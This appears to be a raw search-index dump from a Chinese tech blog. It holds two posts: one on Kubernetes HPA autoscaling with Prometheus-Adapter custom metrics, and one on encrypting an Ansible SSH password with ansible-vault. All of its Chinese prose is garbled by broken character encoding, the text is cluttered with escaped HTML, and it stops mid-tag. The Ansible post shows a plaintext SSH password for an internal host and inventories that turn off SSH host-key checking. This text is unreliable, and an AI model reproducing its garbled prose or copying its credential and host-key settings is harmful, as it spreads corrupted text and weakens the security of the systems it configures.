nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;5xx\u0026#34;} 0 nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;total\u0026#34;} 15576 nginx_vts_server_request_seconds_total{host=\u0026#34;_\u0026#34;} 0.000 nginx_vts_server_request_seconds{host=\u0026#34;_\u0026#34;} 0.000 nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;miss\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;bypass\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;expired\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;stale\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;updating\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;revalidated\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;hit\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;scarce\u0026#34;} 0 nginx_vts_server_bytes_total{host=\u0026#34;*\u0026#34;,direction=\u0026#34;in\u0026#34;} 3303449 nginx_vts_server_bytes_total{host=\u0026#34;*\u0026#34;,direction=\u0026#34;out\u0026#34;} 61641572 nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;1xx\u0026#34;} 0 nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;2xx\u0026#34;} 15574 nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;3xx\u0026#34;} 0 nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;4xx\u0026#34;} 2 nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;5xx\u0026#34;} 0 nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;total\u0026#34;} 15576 nginx_vts_server_request_seconds_total{host=\u0026#34;*\u0026#34;} 0.000 nginx_vts_server_request_seconds{host=\u0026#34;*\u0026#34;} 0.000 nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;miss\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;bypass\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;expired\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;stale\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;updating\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;revalidated\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;hit\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;scarce\u0026#34;} 0 ç„¶åç”¨ wrk éšæœºå‘ç‹‚å‘è¯·æ±‚å‹ä¸€æŠŠï¼Œæˆ‘ä»¬å» prometheus çš„é¢æ¿çœ‹çœ‹æŒ‡æ ‡è¢«æ”¶é›†åˆ°æ²¡æœ‰\nå¾ˆç–¯ç‹‚å•Šã€‚æˆ‘ä»¬ç¼–è¾‘ Prometheus-Adapter çš„ configmap ï¼ŒåŠ ä¸Šå¦‚ä¸‹å†…å®¹\nrules: - seriesQuery: \u0026#39;nginx_vts_server_requests_total\u0026#39; seriesFilters: [] resources: overrides: kubernetes_namespace: resource: namespace kubernetes_pod_name: resource: pod name: matches: \u0026#34;^(.*)_total\u0026#34; as: \u0026#34;${1}_per_second\u0026#34; metricsQuery: (sum(rate(\u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;}[1m])) by (\u0026lt;\u0026lt;.GroupBy\u0026gt;\u0026gt;)) ç„¶åæ€äº† Prometheus-Adapter çš„ Pod è®©å®ƒé‡å¯é‡æ–°åŠ è½½é…ç½®ï¼Œè¿‡æ®µæ—¶é—´è®¿é—®ä¸€ä¸‹ï¼Œçœ‹çœ‹å€¼ï¼Œæ˜¯527m\nkubectl get --raw \u0026#34;/apis/custom.metrics.k8s.io/v1beta1/namespaces/default/pods/*/nginx_vts_server_requests_per_second\u0026#34; | jq . { \u0026#34;kind\u0026#34;: \u0026#34;MetricValueList\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;custom.metrics.k8s.io/v1beta1\u0026#34;, \u0026#34;metadata\u0026#34;: { \u0026#34;selfLink\u0026#34;: \u0026#34;/apis/custom.metrics.k8s.io/v1beta1/namespaces/default/pods/%2A/nginx_vts_server_requests_per_second\u0026#34; }, \u0026#34;items\u0026#34;: [ { \u0026#34;describedObject\u0026#34;: { \u0026#34;kind\u0026#34;: \u0026#34;Pod\u0026#34;, \u0026#34;namespace\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;hpa-prom-demo-755bb56f85-lvksr\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;/v1\u0026#34; }, \u0026#34;metricName\u0026#34;: \u0026#34;nginx_vts_server_requests_per_second\u0026#34;, \u0026#34;timestamp\u0026#34;: \u0026#34;2020-04-07T09:45:45Z\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;527m\u0026#34;, \u0026#34;selector\u0026#34;: null } ] } okï¼Œæ²¡é—®é¢˜ï¼Œæˆ‘ä»¬å®šä¹‰ä¸ªhpaï¼Œæ ¹æ®è¿™ä¸ªæŒ‡æ ‡æ¥ä¼¸ç¼©\napiVersion: autoscaling/v2beta1 kind: HorizontalPodAutoscaler metadata: name: nginx-hpa spec: scaleTargetRef: apiVersion: apps/v1 kind: Deployment name: nginx-deploy minReplicas: 2 maxReplicas: 5 metrics: - type: Pods pods: metricName: nginx_vts_server_requests_per_second targetAverageValue: 10 è¿™æ ·å°±å¥½äº†ã€‚\nå¦‚æœ pod æœ¬èº«ä¸èƒ½æš´éœ² metric ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ sidecar é‡Œå®‰è£… exporter æ¥æ”¶é›†æ•°æ®å¹¶æš´éœ²å‡ºå»å°±å¯ä»¥äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20211125-kubernetes_hpa/","summary":"\u003cp\u003ekubernetes çš„åŠ¨æ€ä¼¸ç¼© HPA æ˜¯éå¸¸æœ‰ç”¨çš„ç‰¹æ€§ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬çš„æœåŠ¡å™¨æ‰˜ç®¡åœ¨é˜¿é‡Œäº‘çš„ ACK ä¸Šï¼Œk8s æ ¹æ® cpu æˆ–è€… å†…å­˜çš„ä½¿ç”¨æƒ…å†µï¼Œä¼šè‡ªåŠ¨ä¼¸ç¼©å…³é”® pod çš„æ•°é‡ï¼Œä»¥åº”å¯¹å¤§æµé‡çš„æƒ…å½¢ã€‚è€Œä¸”æ›´å¦™çš„æ˜¯ï¼ŒåŠ¨æ€æ‰©å±•çš„ pod å¹¶ä¸æ˜¯ä½¿ç”¨è‡ªå·±çš„å›ºå®šæœåŠ¡å™¨ï¼Œè€Œæ˜¯ä½¿ç”¨é˜¿é‡ŒåŠ¨æ€çš„ ECI è™šæ‹ŸèŠ‚ç‚¹æœåŠ¡å™¨ï¼Œè¿™æ ·å°±çœŸçš„æ˜¯å³å¼€å³ç”¨ï¼Œç”¨å®Œå³æ¯ã€‚æœ‰å¤šå¤§æµé‡ä»˜å¤šå°‘é’±ï¼Œç‰©å°½å…¶ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬å…ˆæ˜ç¡®ä¸€ä¸‹æ¦‚å¿µï¼š\u003c/p\u003e\n\u003cp\u003ek8s çš„èµ„æºæŒ‡æ ‡è·å–æ˜¯é€šè¿‡ api æ¥å£æ¥è·å¾—çš„ï¼Œæœ‰ä¸¤ç§ apiï¼Œä¸€ç§æ˜¯æ ¸å¿ƒæŒ‡æ ‡ï¼Œä¸€ç§æ˜¯è‡ªå®šä¹‰æŒ‡æ ‡ã€‚\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eæ ¸å¿ƒæŒ‡æ ‡ï¼šCore metricsï¼Œç”±metrics-serveræä¾›APIï¼Œå³ metrics.k8s.ioï¼Œä»…æä¾›Nodeå’ŒPodçš„CPUå’Œå†…å­˜ä½¿ç”¨æƒ…å†µã€‚api æ˜¯ \u003ccode\u003emetrics.k8s.io\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eè‡ªå®šä¹‰æŒ‡æ ‡ï¼šCustom Metricsï¼Œç”±Prometheus Adapteræä¾›APIï¼Œå³ custom.metrics.k8s.ioï¼Œç”±æ­¤å¯æ”¯æŒä»»æ„Prometheusé‡‡é›†åˆ°çš„è‡ªå®šä¹‰æŒ‡æ ‡ã€‚api æ˜¯ \u003ccode\u003ecustom.metrics.k8s.io\u003c/code\u003e å’Œ \u003ccode\u003eexternal.metrics.k8s.io\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"ä¸€æ ¸å¿ƒæŒ‡æ ‡metrics-server\"\u003eä¸€ã€æ ¸å¿ƒæŒ‡æ ‡metrics-server\u003c/h2\u003e\n\u003cp\u003eé˜¿é‡Œçš„ ACK ç¼ºçœæ˜¯è£…äº† metrics-server çš„ï¼Œçœ‹ä¸€ä¸‹ï¼Œç³»ç»Ÿé‡Œæœ‰ä¸€ä¸ªmetrics-server\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl get pods -n kube-system\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20211125092117637\" loading=\"lazy\" src=\"/posts/20211125-kubernetes_hpa/image-20211125092117637.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå†çœ‹çœ‹ api çš„æ ¸å¿ƒæŒ‡æ ‡èƒ½æ‹¿åˆ°ä»€ä¹ˆï¼Œå…ˆçœ‹ Node çš„æŒ‡æ ‡ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl get --raw \u003cspan class=\"s2\"\u003e\u0026#34;/apis/metrics.k8s.io\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl get --raw \u003cspan class=\"s2\"\u003e\u0026#34;/apis/metrics.k8s.io/v1beta1\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl get --raw \u003cspan class=\"s2\"\u003e\u0026#34;/apis/metrics.k8s.io/v1beta1/nodes\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq . \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20211125092534308\" loading=\"lazy\" src=\"/posts/20211125-kubernetes_hpa/image-20211125092534308.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¯ä»¥çœ‹åˆ°é˜¿é‡Œ eci è™šæ‹ŸèŠ‚ç‚¹çš„ cpu å’Œ memory èµ„æºã€‚\u003c/p\u003e","title":"kubernetesçš„hpaå’Œè‡ªå®šä¹‰æŒ‡æ ‡hpa"},{"content":"å…¬å¸å·²ç»ç”± saltstack å…¨é¢è½¬å‘äº† ansible ã€‚\nç”¨ ansible-playbook æ‰§è¡Œå„ç§ä»»åŠ¡çš„æ—¶å€™ï¼Œéœ€è¦ç™»å½•ä¸»æœºï¼Œå°±å¿…ç„¶æ¶‰åŠåˆ°ä¸»æœº ssh å¯†ç çš„è¾“å…¥ã€‚\næœ€æ—©æˆ‘ä»¬æ˜¯åœ¨ inventory é‡Œåšäº†å®šä¹‰ï¼š\n[deqin:vars] ansible_ssh_common_args=\u0026#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u0026#34; host_key_checking=False ansible_ssh_user=\u0026#34;peadmin\u0026#34; ansible_ssh_pass=\u0026#34;Fuck2021!\u0026#34; [deqin] 192.168.1.19 å¤ªç›´ç™½äº†ï¼Œæ‰€æœ‰çœ‹åˆ°è¿™æ–‡ä»¶å†…å®¹çš„äººéƒ½ä¼šçŸ¥é“å¯†ç äº†ã€‚å®Œå…¨æ²¡æœ‰å®‰å…¨æ€§ï¼Œè¿™æ ·è¡Œä¸é€šå•Šï¼\nå¥½åœ¨ ansible-vault æä¾›äº†ä¸€ç§æ–¹æ³•æ¥è§£å†³ï¼šé‚£å°±æ˜¯ç”Ÿæˆä¸€ä¸ªå¯†æ–‡æ”¾è¿›å»ï¼Œç„¶åè§£å¼€å®ƒå¿…é¡»å†è¾“å…¥ä¸€ä¸ªå¯†ç ã€‚è¿™æ ·çœ‹åˆ°çš„äººä¹Ÿä¸çŸ¥é“å®é™…çš„å¯†ç åˆ°åº•æ˜¯ä»€ä¹ˆ\nå…·ä½“çš„åšæ³•å¦‚ä¸‹ï¼Œé¦–å…ˆç”Ÿæˆ key \u0026ndash;\u0026gt; åŠ å¯†å­—ç¬¦ä¸²çš„é”®å€¼å¯¹ï¼š\nansible-vault encrypt_string \u0026#39;Fuck2021!\u0026#39; --name \u0026#39;ansible_ssh_pass\u0026#39; è¾“å…¥å¯†ç ï¼Œä¼šå¾—åˆ°ä¸‹é¢ä¸€ä¸²å­—ç¬¦\nansible_ssh_pass: !vault | $ANSIBLE_VAULT;1.1;AES256 37393235646234613332646366306233346330656666623862313339313861393239646261366237 6663343263363161643634653266343466356634656539650a393834663938636165336431656433 66333761643538623434363334316661653035313166333137373562363436613636366162353239 3661623733323933350a373164626131646235616361356638653733646534616163393362373135 6139 è¿™ä¸ªå°±æ˜¯å¯†æ–‡äº†ï¼Œå¿…é¡»ç”¨è¾“å…¥çš„å¯†ç æ‰èƒ½è§£å¼€ã€‚\næ³¨æ„ï¼šè¿™é‡Œçš„é”®å€¼ name ä¸å¯æ”¹å˜ï¼Œå¦‚æœä½ æƒ³æŠŠå­—ç¬¦ä¸²æ‹·è´ä¸‹æ¥ï¼Œæ”¹æ‰ ansible_ssh_pass çš„åå­—ï¼Œæ”¹æˆåˆ«çš„ï¼Œæƒ³æ”¹åå¼•ç”¨ï¼Œæ˜¯ä¸è¡Œçš„ã€‚\nè¿™ä¸€å¤§é•¿ä¸²å¯†æ–‡æœ‰ä»¥ä¸‹ä¸¤ç§ç”¨æ³•ï¼š\nä¸€ã€iniæ ¼å¼çš„inventoryå¼•ç”¨ æœ€åŸå§‹çš„ inventory.ini å†…å®¹å¦‚ä¸‹ï¼š\n[deqin:vars] ansible_ssh_common_args=\u0026#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u0026#34; host_key_checking=False ansible_ssh_user=\u0026#34;peadmin\u0026#34; [deqin] 192.168.1.19 æˆ‘ä»¬å®šä¹‰ playbook æ–‡ä»¶ shenji.ymlï¼š\n- hosts: deqin become: yes vars_files: - pass.yml vars: ansible_ssh_pass: \u0026#39;{{ ansible_ssh_pass }}\u0026#39; tasks: - name: mkdirs file: path=\u0026#34;{{ item }}\u0026#34; state=directory with_items: - \u0026#34;OS.05\u0026#34; - \u0026#34;OS.06\u0026#34; æŠŠå¯†æ–‡æ”¾è¿› pass.yml æ–‡ä»¶\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; pass.yml ansible_ssh_pass: !vault | $ANSIBLE_VAULT;1.1;AES256 37393235646234613332646366306233346330656666623862313339313861393239646261366237 6663343263363161643634653266343466356634656539650a393834663938636165336431656433 66333761643538623434363334316661653035313166333137373562363436613636366162353239 3661623733323933350a373164626131646235616361356638653733646534616163393362373135 6139 EOF è¿è¡Œ playbookï¼š\nansible-playbook --ask-vault-pass -i inventory.ini shenji.yml -vvv ä¸ºä»€ä¹ˆè¿™æ ·å‘¢ï¼Ÿå› ä¸º ansible-vault åŠ å¯†è¿‡çš„å­—ç¬¦ä¸²æ˜¯ yaml æ ¼å¼çš„ï¼Œåœ¨ ini é‡Œæ— æ³•ç›´æ¥å¼•ç”¨ã€‚\næ‰€ä»¥åœ¨ playbook çš„ yaml æ–‡ä»¶ä¸­å¼•å…¥å®ƒï¼Œç„¶åå†è·Ÿä» inventory.ini ä¸­è·å–çš„å˜é‡åˆä½œä¸€èµ·ã€‚\näºŒã€yamlæ ¼å¼çš„inventoryå¼•ç”¨ ä¸Šé¢æˆ‘ä»¬çœ‹åˆ°äº†å¿…é¡»é—´æ¥å¼•ç”¨æ‰å¯ä»¥ï¼Œä¸ºäº†é¿å…æ‰ pass.yml æ–‡ä»¶ï¼Œé‚£ä¹ˆå¹²è„†æŠŠ inventroy ç”¨ yaml æ ¼å¼æ¥å†™ï¼Œé‚£ä¸å°±å¯ä»¥äº†ä¹ˆ\nå¦‚ä¸‹å³å¯ï¼š\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; inventory.yml --- all: hosts: deqin: ansible_host: 192.168.1.19 vars: host_key_checking: \u0026#34;False\u0026#34; ansible_ssh_common_args: \u0026#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u0026#34; ansible_ssh_pass: !vault | $ANSIBLE_VAULT;1.1;AES256 37393235646234613332646366306233346330656666623862313339313861393239646261366237 6663343263363161643634653266343466356634656539650a393834663938636165336431656433 66333761643538623434363334316661653035313166333137373562363436613636366162353239 3661623733323933350a373164626131646235616361356638653733646534616163393362373135 6139 EOF ç„¶åè¿è¡Œå°±å¯ä»¥äº†ï¼š\nansible-playbook --ask-vault-pass -i inventory.yml shenji.yml -vvv ","permalink":"https://rendoumi.com/posts/20211124-ansible_vault/","summary":"\u003cp\u003eå…¬å¸å·²ç»ç”± saltstack å…¨é¢è½¬å‘äº† ansible ã€‚\u003c/p\u003e\n\u003cp\u003eç”¨ ansible-playbook æ‰§è¡Œå„ç§ä»»åŠ¡çš„æ—¶å€™ï¼Œéœ€è¦ç™»å½•ä¸»æœºï¼Œå°±å¿…ç„¶æ¶‰åŠåˆ°ä¸»æœº ssh å¯†ç çš„è¾“å…¥ã€‚\u003c/p\u003e\n\u003cp\u003eæœ€æ—©æˆ‘ä»¬æ˜¯åœ¨ inventory é‡Œåšäº†å®šä¹‰ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[deqin:vars]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eansible_ssh_common_args\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ehost_key_checking\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eansible_ssh_user\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;peadmin\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eansible_ssh_pass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Fuck2021!\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[deqin]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e192.168.1.19\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¤ªç›´ç™½äº†ï¼Œæ‰€æœ‰çœ‹åˆ°è¿™æ–‡ä»¶å†…å®¹çš„äººéƒ½ä¼šçŸ¥é“å¯†ç äº†ã€‚å®Œå…¨æ²¡æœ‰å®‰å…¨æ€§ï¼Œè¿™æ ·è¡Œä¸é€šå•Šï¼\u003c/p\u003e\n\u003cp\u003eå¥½åœ¨ ansible-vault æä¾›äº†ä¸€ç§æ–¹æ³•æ¥è§£å†³ï¼šé‚£å°±æ˜¯ç”Ÿæˆä¸€ä¸ªå¯†æ–‡æ”¾è¿›å»ï¼Œç„¶åè§£å¼€å®ƒå¿…é¡»å†è¾“å…¥ä¸€ä¸ªå¯†ç ã€‚è¿™æ ·çœ‹åˆ°çš„äººä¹Ÿä¸çŸ¥é“å®é™…çš„å¯†ç åˆ°åº•æ˜¯ä»€ä¹ˆ\u003c/p\u003e\n\u003cp\u003eå…·ä½“çš„åšæ³•å¦‚ä¸‹ï¼Œé¦–å…ˆç”Ÿæˆ key \u0026ndash;\u0026gt; åŠ å¯†å­—ç¬¦ä¸²çš„é”®å€¼å¯¹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eansible-vault encrypt_string \u003cspan class=\"s1\"\u003e\u0026#39;Fuck2021!\u0026#39;\u003c/span\u003e --name \u003cspan class=\"s1\"\u003e\u0026#39;ansible_ssh_pass\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¾“å…¥å¯†ç ï¼Œä¼šå¾—åˆ°ä¸‹é¢ä¸€ä¸²å­—ç¬¦\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eansible_ssh_pass: !vault |\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"na\"\u003e$ANSIBLE_VAULT;1.1;AES256\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"na\"\u003e37393235646234613332646366306233346330656666623862313339313861393239646261366237\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"na\"\u003e6663343263363161643634653266343466356634656539650a393834663938636165336431656433\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"na\"\u003e66333761643538623434363334316661653035313166333137373562363436613636366162353239\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"na\"\u003e3661623733323933350a373164626131646235616361356638653733646534616163393362373135\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"na\"\u003e6139\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™ä¸ªå°±æ˜¯å¯†æ–‡äº†ï¼Œå¿…é¡»ç”¨è¾“å…¥çš„å¯†ç æ‰èƒ½è§£å¼€ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eæ³¨æ„\u003c/strong\u003eï¼šè¿™é‡Œçš„é”®å€¼ name ä¸å¯æ”¹å˜ï¼Œå¦‚æœä½ æƒ³æŠŠå­—ç¬¦ä¸²æ‹·è´ä¸‹æ¥ï¼Œæ”¹æ‰ ansible_ssh_pass çš„åå­—ï¼Œæ”¹æˆåˆ«çš„ï¼Œæƒ³æ”¹åå¼•ç”¨ï¼Œæ˜¯ä¸è¡Œçš„ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸€å¤§é•¿ä¸²å¯†æ–‡æœ‰ä»¥ä¸‹ä¸¤ç§ç”¨æ³•ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€iniæ ¼å¼çš„inventoryå¼•ç”¨\"\u003eä¸€ã€iniæ ¼å¼çš„inventoryå¼•ç”¨\u003c/h2\u003e\n\u003cp\u003eæœ€åŸå§‹çš„ inventory.ini å†…å®¹å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[deqin:vars]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eansible_ssh_common_args\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ehost_key_checking\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eansible_ssh_user\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;peadmin\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[deqin]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e192.168.1.19\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ‘ä»¬å®šä¹‰ playbook æ–‡ä»¶ shenji.ymlï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- \u003cspan class=\"nt\"\u003ehosts\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003edeqin\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ebecome\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003eyes\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003evars_files\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan 